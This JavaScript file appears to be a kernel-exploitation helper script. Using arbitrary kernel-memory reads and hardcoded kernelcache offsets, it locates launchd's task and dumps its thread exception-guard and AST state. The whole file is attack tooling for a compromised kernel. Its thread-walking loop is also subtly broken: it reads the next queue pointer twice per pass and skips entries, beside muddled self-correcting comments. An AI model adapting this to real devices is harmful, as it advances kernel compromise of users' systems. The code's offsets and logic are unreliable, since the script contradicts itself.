// verify_exc_state.js — Check launchd thread state with VERIFIED offsets
// Run via: .load scripts/verify_exc_state.js
//
// Verified offsets (from kernelcache disassembly):
//   task threads queue: task+0x50 (next), task+0x58 (prev)
//   thread task_threads: thread+0x3e0 (next in queue, points to next_thread+0x3e0)
//   thread TRO: thread+0x3f0
//   thread AST: thread+0x414
//   thread mutex: thread+0x420
//   thread ctid: thread+0x4b0
//   thread guardExcCode: thread+0x4c0
//   task excGuard: task+0x624

log('=== Verifying launchd thread state (corrected offsets) ===');

var kt = kread64(slide('0xc1bf78'));
var task = kread64(add(kt, '0x30'));
var myPid = pid();
var launchdTask = '0x0';

for (var i = 0; i < 600; i++) {
  if (task == '0x0' || task == kt) break;
  var procRO = kread64(add(task, '0x3e0'));
  if (procRO == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var proc = kread64(procRO);
  if (proc == '0x0') { task = kread64(add(task, '0x30')); continue; }
  var p = parseInt(kread32(add(proc, '0x60')), 16);
  if (p == 1) { launchdTask = task; break; }
  task = kread64(add(task, '0x30'));
}

log('launchd task: ' + launchdTask);
var excGuard = kread64(add(launchdTask, '0x624'));
log('launchd exc_guard: ' + excGuard);

// Walk launchd threads via queue at task+0x50
// task+0x50 = queue head next → first_thread+0x3e0
// thread+0x3e0 = next_thread+0x3e0
// terminates when entry == task+0x50
var queueHead = add(launchdTask, '0x50');
var entry = kread64(queueHead);
var threadCount = 0;

log('Queue head addr: ' + queueHead);
log('First entry: ' + entry);

while (entry != '0x0' && entry != queueHead && threadCount < 30) {
  threadCount++;
  // thread base = entry - 0x3e0
  var entryNum = BigInt(entry);
  var threadBase = '0x' + (entryNum - 0x3e0n).toString(16);

  var gec = kread64(add(threadBase, '0x4c0'));
  var ast = kread32(add(threadBase, '0x414'));
  var tro = kread64(add(threadBase, '0x3f0'));
  var mutex = kread64(add(threadBase, '0x420'));

  var hasGuard = (parseInt(ast, 16) & 0x1000) != 0;
  var hasCode = gec != '0x0';

  log('thread[' + threadCount + ']: ' + threadBase +
      ' ast=' + ast + (hasGuard ? ' AST_GUARD!' : '') +
      ' gec=' + gec + (hasCode ? ' HAS_CODE' : '') +
      ' mutex=' + mutex);

  // Next entry
  entry = kread64(add(entry, '0x0'));  // entry->next (queue_entry.next is at +0)
  // But wait: thread+0x3e0 is the queue entry. entry->next = thread+0x3e0.next
  // which is at (thread+0x3e0)+0x0 = thread+0x3e0. That's just the same.
  // The queue_entry has {next, prev} at {+0, +8}.
  // kread64(entry) reads the next pointer from the current entry.
  // But entry IS the address of the queue_entry (thread+0x3e0).
  // So kread64(entry) = *(thread+0x3e0) = next_entry address
  // Actually that's wrong too. The entry VALUE is thread+0x3e0.
  // We need to read [thread+0x3e0] to get the next entry.
  // But we already read entry = kread64(queueHead) which gave us
  // the first thread's task_threads.next. To get the next:
  // entry = kread64(threadBase + '0x3e0')
  // But wait, entry IS already at threadBase+0x3e0.
  // Let me just read from the current entry address to get next:
  entry = kread64(entry);  // entry = *(current_entry) = next queue entry
}

log('Total launchd threads: ' + threadCount);
'verify_done';
